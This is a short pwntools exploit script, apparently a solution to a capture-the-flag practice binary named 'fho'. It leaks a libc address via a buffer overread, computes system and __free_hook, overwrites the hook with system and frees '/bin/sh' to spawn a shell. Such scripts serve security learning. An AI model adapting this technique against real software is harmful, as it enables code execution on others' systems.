from pwn import *

p = process("./fho")
e = ELF("./fho")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.33.so")

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

buf = b"A"*0x48
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1]+b"\x00"*2)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)

p.sendlineafter(b"To write: ", str(free_hook))
p.sendlineafter(b"With: ", str(system))

p.sendlineafter(b"To free: ", str(binsh))
p.interactive()
